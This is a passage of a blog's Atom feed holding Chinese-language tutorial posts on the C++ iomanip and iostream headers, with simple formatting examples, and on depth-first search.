y)</code>：返回一个与 <code>y</code> 有相同符号的 <code>x</code> 的值。</li></ul><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>大多数 <code>cmath</code> 函数都会处理其参数范围内的有效值，但对于某些边界情况（如除以零、取负数的平方根等），这些函数可能会返回特定的值（如 <code>std::nan</code> 或 <code>std::inf</code>）或抛出异常。</li><li>使用 <code>cmath</code> 函数时，请注意它们的参数类型（整数还是浮点数），因为不同的类型可能对应不同的重载版本。</li><li>对于涉及浮点数运算的精度问题，要特别小心，因为浮点运算可能会受到计算机表示法的限制。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    <category term="c/c++头文件" scheme="http://example.com/categories/c-c/c-c-%E5%A4%B4%E6%96%87%E4%BB%B6/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>iomanip头文件</title>
    <link href="http://example.com/2024/10/15/c%E2%81%84c++/iomanip%E8%AF%B4%E6%98%8E/"/>
    <id>http://example.com/2024/10/15/c%E2%81%84c++/iomanip%E8%AF%B4%E6%98%8E/</id>
    <published>2024-10-15T11:30:53.000Z</published>
    <updated>2024-12-25T16:08:48.498Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><code>iomanip</code> 是 C++ 标准库中的一个头文件，它提供了一系列用于格式化输入输出的操纵器（manipulators）。这些操纵器允许你控制浮点数的精度、整数的格式、填充字符、宽度等。以下是一些常用的 <code>iomanip</code> 操纵器及其用法：</p><h3 id="1-setprecision"><a href="#1-setprecision" class="headerlink" title="1. setprecision"></a>1. <code>setprecision</code></h3><p>用于设置浮点数的显示精度（总有效数字位数或小数点后的位数，具体取决于 <code>fixed</code> 或 <code>scientific</code> 操纵器）。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> num = <span class="number">123.456789</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default precision: &quot;</span> &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Precision 3: &quot;</span> &lt;&lt; std::<span class="built_in">setprecision</span>(<span class="number">3</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Precision 5: &quot;</span> &lt;&lt; std::<span class="built_in">setprecision</span>(<span class="number">5</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="2-fixed-和-scientific"><a href="#2-fixed-和-scientific" class="headerlink" title="2. fixed 和 scientific"></a>2. <code>fixed</code> 和 <code>scientific</code></h3><p><code>fixed</code> 使得浮点数以定点表示法显示（即总是显示小数点），而 <code>scientific</code> 以科学计数法显示。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> num = <span class="number">123.456789</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default: &quot;</span> &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Fixed: &quot;</span> &lt;&lt; std::fixed &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Scientific: &quot;</span> &lt;&lt; std::scientific &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="3-setw"><a href="#3-setw" class="headerlink" title="3. setw"></a>3. <code>setw</code></h3><p>用于设置下一个输出字段的宽度。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">42</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default width: &quot;</span> &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Width 10: &quot;</span> &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">10</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="4-setfill"><a href="#4-setfill" class="headerlink" title="4. setfill"></a>4. <code>setfill</code></h3><p>用于设置填充字符，通常与 <code>setw</code> 一起使用。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">42</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default fill: &quot;</span> &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">10</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Fill with &#x27;*&#x27;: &quot;</span> &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;*&#x27;</span>) &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">10</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="5-left-right-internal"><a href="#5-left-right-internal" class="headerlink" title="5. left, right, internal"></a>5. <code>left</code>, <code>right</code>, <code>internal</code></h3><p>用于设置字段的对齐方式。<code>left</code> 左对齐，<code>right</code> 右对齐，<code>internal</code> 使得填充字符在符号和数字之间（主要用于科学计数法）。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> num = <span class="number">-123.456</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default align: &quot;</span> &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">15</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Left align: &quot;</span> &lt;&lt; std::left &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">15</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Right align: &quot;</span> &lt;&lt; std::right &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">15</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Internal align (scientific): &quot;</span> &lt;&lt; std::scientific &lt;&lt; std::internal &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">15</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="6-boolalpha-和-noboolalpha"><a href="#6-boolalpha-和-noboolalpha" class="headerlink" title="6. boolalpha 和 noboolalpha"></a>6. <code>boolalpha</code> 和 <code>noboolalpha</code></h3><p>用于控制布尔值的输出格式。<code>boolalpha</code> 使布尔值以 <code>true</code> 或 <code>false</code> 输出，而 <code>noboolalpha</code> 使其以 <code>1</code> 或 <code>0</code> 输出。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default bool: &quot;</span> &lt;&lt; flag &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Boolalpha: &quot;</span> &lt;&lt; std::boolalpha &lt;&lt; flag &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Noboolalpha: &quot;</span> &lt;&lt; std::noboolalpha &lt;&lt; flag &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="7-showbase-和-noshowbase"><a href="#7-showbase-和-noshowbase" class="headerlink" title="7. showbase 和 noshowbase"></a>7. <code>showbase</code> 和 <code>noshowbase</code></h3><p>用于控制是否显示数值的基数前缀（如八进制的 <code>0</code>，十六进制的 <code>0x</code>）。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">255</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default base: &quot;</span> &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Hexadecimal with showbase: &quot;</span> &lt;&lt; std::hex &lt;&lt; std::showbase &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Hexadecimal without showbase: &quot;</span> &lt;&lt; std::hex &lt;&lt; std::noshowbase &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="8-uppercase-和-nouppercase"><a href="#8-uppercase-和-nouppercase" class="headerlink" title="8. uppercase 和 nouppercase"></a>8. <code>uppercase</code> 和 <code>nouppercase</code></h3><p>用于控制十六进制和八进制数值的输出是否使用大写字母。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">255</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default hex: &quot;</span> &lt;&lt; std::hex &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Uppercase hex: &quot;</span> &lt;&lt; std::hex &lt;&lt; std::uppercase &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Lowercase hex: &quot;</span> &lt;&lt; std::hex &lt;&lt; std::nouppercase &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这些操纵器可以通过组合使用，以满足各种格式化需求。记住，操纵器通常只对下一个输出操作有效，除非显式地重置。</p><hr><p>在C++中，如果你想要为整个程序或某个特定作用域内的输出设置统一的格式，你可以通过修改流对象（如<code>std::cout</code>）的格式状态来实现。这些修改通常是临时的，除非你显式地保存并恢复这些状态，或者使用某些全局设置方法（尽管C++标准库并不直接提供全局设置所有输出的方法）。</p><p>以下是一些控制输出格式的方法，这些方法可以在一定程度上实现全局或持久化的效果：</p><ol><li><p><strong>使用<code>std::ios_base</code>的静态成员函数</strong>：<br>虽然<code>std::ios_base</code>提供了设置和获取格式状态的静态成员函数（如<code>sync_with_stdio</code>），但它们并不直接用于格式化输出。这些函数主要用于控制C++流与C标准I&#x2F;O库之间的同步。</p></li><li><p><strong>创建自定义的流对象</strong>：<br>你可以创建一个自定义的流对象，并设置其格式状态。然后，在你的程序中使用这个自定义的流对象进行输出。这种方法的好处是你可以在不同的作用域或模块中轻松地重用这些设置。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::ostream&amp; my_cout = std::cout; <span class="comment">// 实际上，这里只是引用了std::cout</span></span><br><span class="line"><span class="comment">// 或者，你可以创建一个stringstream或其他ostream派生类的对象</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 设置自定义流的格式状态</span></span><br><span class="line">    my_cout &lt;&lt; std::fixed &lt;&lt; std::<span class="built_in">setprecision</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用自定义流进行输出</span></span><br><span class="line">    <span class="type">double</span> num = <span class="number">123.456789</span>;</span><br><span class="line">    my_cout &lt;&lt; <span class="string">&quot;Formatted output: &quot;</span> &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注意：这里my_cout实际上是std::cout的引用，所以它的设置会影响到std::cout</span></span><br><span class="line">    <span class="comment">// 如果你不想影响std::cout，应该创建一个独立的ostream对象</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>注意</strong>：在上面的例子中，<code>my_cout</code>实际上是<code>std::cout</code>的引用，所以对它所做的任何修改都会影响到<code>std::cout</code>。如果你想要一个独立的流对象，你应该创建一个<code>std::ostringstream</code>或其他<code>std::ostream</code>派生类的对象。</p></li><li><p><strong>使用函数封装格式设置</strong>：<br>你可以编写一个函数，该函数接受一个流对象和必要的格式参数，并设置流对象的格式状态。然后，在你的程序中调用这个函数来设置输出格式。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_output_format</span><span class="params">(std::ostream&amp; os, <span class="type">int</span> precision = <span class="number">2</span>)</span> </span>&#123;</span><br><span class="line">    os &lt;&lt; std::fixed &lt;&lt; std::<span class="built_in">setprecision</span>(precision);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">set_output_format</span>(std::cout);</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> num = <span class="number">123.456789</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Formatted output: &quot;</span> &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    <category term="c/c++头文件" scheme="http://example.com/categories/c-c/c-c-%E5%A4%B4%E6%96%87%E4%BB%B6/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>iostream头文件</title>
    <link href="http://example.com/2024/10/15/c%E2%81%84c++/iostream%E8%AF%B4%E6%98%8E/"/>
    <id>http://example.com/2024/10/15/c%E2%81%84c++/iostream%E8%AF%B4%E6%98%8E/</id>
    <published>2024-10-15T11:10:53.000Z</published>
    <updated>2024-12-25T16:08:48.498Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><code>iostream</code>库提供了丰富的功能来控制输出的格式。以下是一些使用<code>iostream</code>库控制输出格式的方法：</p><h3 id="1-主要类："><a href="#1-主要类：" class="headerlink" title="1. 主要类："></a>1. <strong>主要类</strong>：</h3><ul><li><code>std::istream</code>：用于输入操作的抽象基类，提供了基本的输入功能。</li><li><code>std::ostream</code>：用于输出操作的抽象基类，提供了基本的输出功能。</li><li><code>std::iostream</code>：继承自<code>std::istream</code>和<code>std::ostream</code>，用于同时进行输入和输出操作。</li><li><code>std::cin</code>：标准输入流对象，通常与键盘关联，用于接收用户输入。</li><li><code>std::cout</code>：标准输出流对象，通常与屏幕关联，用于向用户显示信息。</li><li><code>std::cerr</code>：标准错误输出流对象，不带缓冲，用于输出错误信息。</li><li><code>std::clog</code>：标准日志流对象，带缓冲，用于输出日志信息。</li></ul><h3 id="2-常用操作符："><a href="#2-常用操作符：" class="headerlink" title="2. 常用操作符："></a>2. <strong>常用操作符</strong>：</h3><ul><li><code>&gt;&gt;</code>：输入操作符，用于从输入流中读取数据。</li><li><code>&lt;&lt;</code>：输出操作符，用于将数据写入输出流。</li></ul><h3 id="3-基本用法："><a href="#3-基本用法：" class="headerlink" title="3. 基本用法："></a>3. <strong>基本用法</strong>：</h3><ul><li>标准输入和输出：通过<code>std::cout</code>输出信息，通过<code>std::cin</code>读取用户输入，实现基本的交互功能。</li><li>标准错误输出：使用<code>std::cerr</code>输出错误信息，不带缓冲，立即显示在屏幕上。</li><li>标准日志输出：使用<code>std::clog</code>输出日志信息，带缓冲，可以与其他输出分开处理。</li></ul><h3 id="4-格式化输出："><a href="#4-格式化输出：" class="headerlink" title="4. 格式化输出："></a>4. <strong>格式化输出</strong>：</h3><ul><li>使用<code>&lt;iomanip&gt;</code>库对输出进行格式化，包括设置宽度、精度和对齐方式。</li><li><code>std::setprecision(int n)</code>：设置浮点数的输出精度为n位小数。</li><li><code>std::setw(int n)</code>：设置输出的最小宽度为n个字符，不足部分用空格填充。</li><li><code>std::left</code>和<code>std::right</code>：设置输出内容的对齐方式，分别为左对齐和右对齐。</li></ul><h3 id="5-流的状态检查："><a href="#5-流的状态检查：" class="headerlink" title="5. 流的状态检查："></a>5. <strong>流的状态检查</strong>：</h3><ul><li>可以检查输入输出流的状态，以确定操作是否成功。</li><li>使用<code>std::cin.fail()</code>检查输入操作是否失败，若失败则输出错误信息。</li></ul><h3 id="6-处理字符串输入："><a href="#6-处理字符串输入：" class="headerlink" title="6. 处理字符串输入："></a>6. <strong>处理字符串输入</strong>：</h3><ul><li>使用<code>std::getline</code>函数读取包含空格的整行输入，适用于读取较长的字符串或包含空格的输入。</li></ul><h3 id="7-综合应用："><a href="#7-综合应用：" class="headerlink" title="7. 综合应用："></a>7. <strong>综合应用</strong>：</h3><ul><li>在实际编程中，可以将以上功能综合应用，实现复杂的输入输出处理。</li><li>例如，通过读取用户输入的数据，进行一系列计算后，将结果格式化输出到屏幕上。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    <category term="c/c++头文件" scheme="http://example.com/categories/c-c/c-c-%E5%A4%B4%E6%96%87%E4%BB%B6/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>dfs算法</title>
    <link href="http://example.com/2024/10/14/%E7%AE%97%E6%B3%95/dfs%E7%AE%97%E6%B3%95/"/>
    <id>http://example.com/2024/10/14/%E7%AE%97%E6%B3%95/dfs%E7%AE%97%E6%B3%95/</id>
    <published>2024-10-14T19:20:53.000Z</published>
    <updated>2024-12-25T16:08:48.502Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="一、算法原理"><a href="#一、算法原理" class="headerlink" title="一、算法原理"></a>一、算法原理</h3><p>DFS算法从起始节点开始，沿着一条路径尽可能深地访问下去，直到无法再继续（即到达叶子节点或遇到已访问过的节点），然后回溯到上一个节点，继续探索其他路径。这种方式类似于迷宫中的探索策略，深入一条路直到死胡同，然后返回上一个岔路口继续探索其他路。</p><h3 id="二、实现方法"><a href="#二、实现方法" class="headerlink" title="二、实现方法"></a>二、实现方法</h3><p>DFS算法可以通过递归或显式栈来实现。以下是两种实现方法的简要介绍：</p><ol><li><p><strong>递归实现</strong>：</p><ul><li>选择一个起始节点作为当前节点，并标记为已访问。</li><li>检查当前节点是否满足终止条件（如到达目标节点或无法继续深入），如果满足则返回结果。</li><li>如果不满足终止条件，则遍历当前节点的所有未访问的邻居节点。</li><li>对每个未访问的邻居节点，递归调用DFS函数，将其作为新的当前节点。</li><li>当当前节点的所有邻居节点都被访问过时，回溯到上一层节点。</li></ul></li><li><p><strong>显式栈实现</strong>：</p><ul><li>使用一个栈来保存待访问的节点。</li><li>将起始节点压入栈中，并标记为已访问。</li><li>当栈不为空时，执行以下操作：<ul><li>弹出栈顶节点作为当前节点。</li><li>处理当前节点（如打印、记录等）。</li><li>遍历当前节点的所有未访问的邻居节点，并将它们压入栈中。</li></ul></li></ul></li></ol><h3 id="三、算法特点"><a href="#三、算法特点" class="headerlink" title="三、算法特点"></a>三、算法特点</h3><ol><li><strong>简单易懂</strong>：DFS算法的思想简单，易于理解和实现。</li><li><strong>内存占用小</strong>：DFS使用递归或栈来模拟递归过程，只需要保存当前路径上的节点，因此内存占用较小。</li><li><strong>可解决连通性问题</strong>：对于图，DFS可以用来判断给定的两个节点是否连通。</li><li><strong>寻找可行解</strong>：在搜索问题中，DFS可以被用来寻找一条可行解，通过深度搜索路径来一步步找到目标解。</li><li><strong>没有最优性</strong>：DFS并不保证找到最优解，它只会尽可能往深层次搜索，直到达到终止条件。因此，在某些情况下可能得到次优解。</li><li><strong>可能陷入无限循环</strong>：如果图中存在环路，且没有访问记录的话，DFS可能会陷入无限循环中，导致无法停止。因此，在实际应用中需要特别注意环的检测和处理。</li></ol><h3 id="四、应用场景"><a href="#四、应用场景" class="headerlink" title="四、应用场景"></a>四、应用场景</h3><p>DFS算法在各个领域都有广泛的应用，以下是几个典型的应用场景：</p><ol><li><strong>迷宫问题</strong>：通过深度优先搜索的方式，可以递归地探索迷宫中的每个可能路径，直到找到一条通向终点的路径或者所有路径都被探索完毕。</li><li><strong>社交网络分析</strong>：在社交网络中，DFS算法可以用于模拟信息的传播过程。以某个用户为起点，通过深度优先搜索的方式向其关注的用户传播信息，进而影响更多的用户。这有助于理解信息在社交网络中的传播规律和影响力分析。</li><li><strong>数独问题</strong>：通过递归地尝试不同的数字填充空白格子，然后验证是否满足数独的规则，直到找到满足条件的解。这种方法类似于在搜索树中进行深度优先搜索。</li><li><strong>图像处理</strong>：DFS算法可以用于分析图像中的连通性，即判断图像中的像素点是否相互连通。通过从某个起点开始，递归地探索与之相连的像素点，可以确定图像中的不同区域及其连通性。</li><li><strong>拓扑排序</strong>：对有向无环图（DAG）进行拓扑排序时，可以使用DFS算法。通过深度优先搜索的方式，可以得到一个拓扑序列，其中每个节点的出现顺序满足图中的依赖关系。</li></ol><h3 id="五、注意事项"><a href="#五、注意事项" class="headerlink" title="五、注意事项"></a>五、注意事项</h3><ol><li><strong>环检测</strong>：在有向图中使用DFS时，需要特别注意环的存在。为了避免陷入无限循环，可以使用一个访问标记数组来记录已访问过的节点。</li><li><strong>剪枝策略</strong>：有时在DFS中可以通过剪枝策略来减少搜索空间，提高效率。例如，在求解某些问题时，可以提前判断某些路径不可能得到最优解或满足条件，从而提前终止搜索。</li><li><strong>递归深度</strong>：当图的深度非常大时，DFS使用递归实现可能导致堆栈溢出的风险。因此，在实际应用中需要根据具体情况选择合适的算法实现方式（如使用显式栈代替递归）。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="OJ" scheme="http://example.com/tags/OJ/"/>
    
  </entry>
  
</feed>
